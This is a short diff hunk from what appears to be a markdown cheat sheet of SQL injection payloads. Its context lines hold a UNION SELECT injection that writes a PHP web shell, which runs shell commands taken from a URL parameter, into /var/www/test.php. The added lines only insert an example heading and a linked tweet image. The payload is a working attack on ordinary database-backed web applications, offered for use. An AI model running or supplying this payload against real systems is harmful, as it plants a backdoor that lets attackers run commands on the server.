@@ -40,3 +40,5 @@
 ```sql
 ' UNION SELECT '<?php $out = shell_exec($_GET["x"]); echo "<pre>$out</pre>";?>' \g /var/www/test.php; --
 ```
+**Example**<br>
+[![img](https://pbs.twimg.com/media/EpNcPxHW8AEP2v1?format=jpg&name=large)](https://twitter.com/bugbountynights/status/1338515958567227393?s=20)
